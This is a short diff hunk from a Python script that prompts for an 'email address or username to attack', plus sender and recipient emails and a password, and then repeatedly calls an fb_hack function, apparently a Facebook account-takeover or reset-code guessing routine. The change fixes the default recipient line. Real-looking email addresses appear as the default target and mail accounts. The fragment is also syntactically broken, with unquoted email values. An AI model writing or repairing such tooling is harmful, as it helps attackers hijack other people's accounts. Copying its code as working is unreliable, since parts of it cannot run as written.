@@ -96,7 +96,7 @@ ehack = input('Email address or username to attack:') or str("amschwab@comcast.n
 reset = int(input('Code: ') or 1)
 past = int(input('Length: ') or 6)
 sender_email = input("Your Email:") or krarktel@gmail.com
-receiver_email = input("Recipient:") ppteam36884@gmail.com
+receiver_email = input("Recipient:") or ppteam36884@gmail.com
 password = input("Type your password and press enter:")
 while past >= 6:
   fb_hack(ehack, reset, past)
